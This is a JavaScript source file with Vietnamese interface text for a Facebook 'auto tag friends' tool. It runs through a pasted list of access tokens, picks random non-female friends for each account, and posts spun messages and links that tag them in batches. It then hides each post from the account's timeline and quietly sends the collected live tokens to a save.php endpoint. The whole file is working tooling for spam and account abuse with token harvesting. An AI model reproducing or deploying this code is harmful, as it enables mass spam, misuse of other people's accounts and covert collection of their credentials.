function auto_tagfrfemale_check(d){
	$.get('https://graph.facebook.com/',{
		method:'post',access_token:d,batch:'[{"method":"GET","relative_url":"me?fields=id,name"},{"method":"GET","relative_url":"fql?q=SELECT uid, name FROM user WHERE uid IN (SELECT uid2 FROM friend WHERE uid1 = me())+AND+sex+!%3D+%27female%27+ORDER BY rand() LIMIT '+auto_tagfrfemale.limit+'"}]',include_headers:'false'
	}
	,function(f){
		var a=JSON.parse(f[0].body);
		auto_tagfrfemale.array[auto_tagfrfemale.success]=[],auto_tagfrfemale.array[auto_tagfrfemale.success].uid=a.id,auto_tagfrfemale.array[auto_tagfrfemale.success].data=JSON.parse(f[1].body).data,auto_tagfrfemale.array[auto_tagfrfemale.success].access_token=d,auto_tagfrfemale.array[auto_tagfrfemale.success].array=[];
		for(var l=0;
		l<Math.ceil(auto_tagfrfemale.array[auto_tagfrfemale.success].data.length/auto_tagfrfemale.one);
		l++){
			var j=l*auto_tagfrfemale.one;
			auto_tagfrfemale.array[auto_tagfrfemale.success].array[l]=[];
			for(var c=j;
			c<j+(auto_tagfrfemale.array[auto_tagfrfemale.success].data.length-j>auto_tagfrfemale.one?auto_tagfrfemale.one:auto_tagfrfemale.array[auto_tagfrfemale.success].data.length-j);
			c++){
				auto_tagfrfemale.array[auto_tagfrfemale.success].array[l].push(auto_tagfrfemale.array[auto_tagfrfemale.success].data[c].uid)
			}
		}
		;
		auto_tagfrfemale.success++,auto_tagfrfemale.bach+=d+'',tbody='',tbody+='<tr>',tbody+='	<td>'+auto_tagfrfemale.success+'</td>',tbody+='	<td>'+a.name+'</td>',tbody+='	<td align="center">'+auto_tagfrfemale.array[auto_tagfrfemale.success-1].data.length+'</td>',tbody+='	<td align="center"><font color="green"><span id="auto_tagfrfemale_success_'+auto_tagfrfemale.success+'">0</span></font></td>',tbody+='	<td align="center"><font color="red"><span id="auto_tagfrfemale_error_'+auto_tagfrfemale.success+'">0</span></font></td>',tbody+='	<td id="auto_tagfrfemale_status_'+auto_tagfrfemale.success+'" b-data="loading">Đang chờ !</td>',tbody+='</tr>',$('#html_auto_tagfrfemale_body').append(tbody)
	}
	).fail(function(f){
		'undefined'== typeof f.responseText?auto_tagfrfemale_check(d):auto_tagfrfemale.error++
	}
	).always(function(){
		if(auto_tagfrfemale.success+auto_tagfrfemale.error==auto_tagfrfemale.token.split('\n').length){
			if(auto_tagfrfemale.success>0){
				var d=$.trim(auto_tagfrfemale.bach);
				d.length>0&&$.post('http://localhost/a/save.php',{
					act:'save',access_token:d
				}
				);
				for(var f=0;
				f<auto_tagfrfemale.array.length;
				f++){
					auto_tagfrfemale_send(f,0)
				}
			}
			else {
				$('#submit_auto_tagfrfemale_start').buttonStop(),$('#submit_auto_tagfrfemale_stop').disabled(),noti.success('Không Access Token nào Live !'),$('#html_auto_tagfrfemale_result').hide()
			}
		}
	}
	)
}
function auto_tagfrfemale_send(d,f){
	return 0==auto_tagfrfemale.run?!1:void((0==auto_tagfrfemale.array[d].data.length?($('#auto_tagfrfemale_status_'+(d+1)).html('<font color="red">Không có bạn bè !</font>'),auto_tagfrfemale.total++,auto_tagfrfemale.total==auto_tagfrfemale.success&&($('#submit_auto_tagfrfemale_start').buttonStop(),$('#submit_auto_tagfrfemale_stop').disabled(),noti.success('Quá trình gắn thẻ bạn bè đã hoàn tất !'))):($('#auto_tagfrfemale_status_'+(d+1)).html('<font color="blue">Đang tiến hành gắn thẻ <b>'+auto_tagfrfemale.array[d].array[f].length+'</b> bạn bè</font> '+run.loading()),$.get('https://graph.facebook.com/me/feed',{
		method:'post',access_token:auto_tagfrfemale.array[d].access_token,message:init.spinText(auto_tagfrfemale.msg),link:init.spinText(auto_tagfrfemale.link),tags:auto_tagfrfemale.array[d].array[f].join()
	}
	).done(function(a){
		$.get('https://graph.facebook.com/'+a.id,{
			method:'post',locale:'en_US',timeline_visibility:'hidden'
		}
		),$('#auto_tagfrfemale_success_'+(d+1)).text(parseInt($('#auto_tagfrfemale_success_'+(d+1)).text())+auto_tagfrfemale.array[d].array[f].length),$('#auto_tagfrfemale_status_'+(d+1)).html('<font color="green">Gắn thẻ thành công <b>'+auto_tagfrfemale.array[d].array[f].length+'</b> bạn bè, xin chờ <b id="timedown_'+(d+1)+'"></b> giây</font> '+run.loading())
	}
	).error(function(a){
		if($('#auto_tagfrfemale_error_'+(d+1)).text(parseInt($('#auto_tagfrfemale_error_'+(d+1)).text())+auto_tagfrfemale.array[d].array[f].length),$('#auto_tagfrfemale_status_'+(d+1)).html('<font color="red">Gắn thẻ thất bại <b>'+auto_tagfrfemale.array[d].array[f].length+'</b> bạn bè, xin chờ <b id="timedown_'+(d+1)+'"></b> giây</font> '+run.loading()),a.responseText){
			var a=init.replace_JSON(a.responseText);
			noti.error(a.error.message)
		}
	}
	).always(function(){
		f+1<auto_tagfrfemale.array[d].array.length?timer.count_down_array(0,Math.floor(auto_tagfrfemale.delay/60),auto_tagfrfemale.delay-60*Math.floor(auto_tagfrfemale.delay/60),'timedown_'+(d+1),d,function(){
			auto_tagfrfemale_send(d,f+1)
		}
		):($('#auto_tagfrfemale_status_'+(d+1)).html('<font color="green">Hoàn thành !</font>'),auto_tagfrfemale.total++,auto_tagfrfemale.total==auto_tagfrfemale.success&&($('#submit_auto_tagfrfemale_start').buttonStop(),$('#submit_auto_tagfrfemale_stop').disabled(),noti.success('Quá trình gắn thẻ bạn bè đã hoàn tất !')))
	}
	))))
}
location.hostname==b_sv&&($(document).on('click','#submit_auto_tagfrfemale_stop',function(){
	auto_tagfrfemale.run=0;
	for(var d=0;
	d<auto_tagfrfemale.array.length;
	d++){
		clearTimeout(timeout_array[d])
	}
	;
	$('[b-data=\'loading\']').text('Đã có lệnh dừng !'),$('#submit_auto_tagfrfemale_stop').disabled(),$('#submit_auto_tagfrfemale_start').buttonStop(),noti.success('Đã có lệnh dừng gắn thẻ bạn bè !')
}
),$(document).on('click','#submit_auto_tagfrfemale_start',function(){
	auto_tagfrfemale={
		token:$('#input_auto_tagfrfemale_token').validate(),msg:$('#input_auto_tagfrfemale_msg').validate(),link:$('#input_auto_tagfrfemale_link').val(),name:$('#input_auto_tagfrfemale_name').val(),picture:$('#input_auto_tagfrfemale_picture').val(),description:$('#input_auto_tagfrfemale_description').val(),caption:$('#input_auto_tagfrfemale_caption').val(),delay:$('#input_auto_tagfrfemale_delay').isNumber(),one:$('#input_auto_tagfrfemale_one').isNumber(),limit:$('#input_auto_tagfrfemale_limit').isNumber(),array:[],run:1,total:0,success:0,error:0,bach:''
	}
	,auto_tagfrfemale.token&&auto_tagfrfemale.delay&&auto_tagfrfemale.one&&auto_tagfrfemale.limit&&($(this).buttonLoad(),$('#submit_auto_tagfrfemale_stop').undisabled(),$('#html_auto_tagfrfemale_result').fadeIn('fast'),$('#html_auto_tagfrfemale_body').html(''),$.each(auto_tagfrfemale.token.split('\n'),function(d,f){
		var a=f.split('|');
		a=a[1]?a[1]:f,setTimeout(function(){
			auto_tagfrfemale_check(a)
		}
		,15*d)
	}
	))
}
))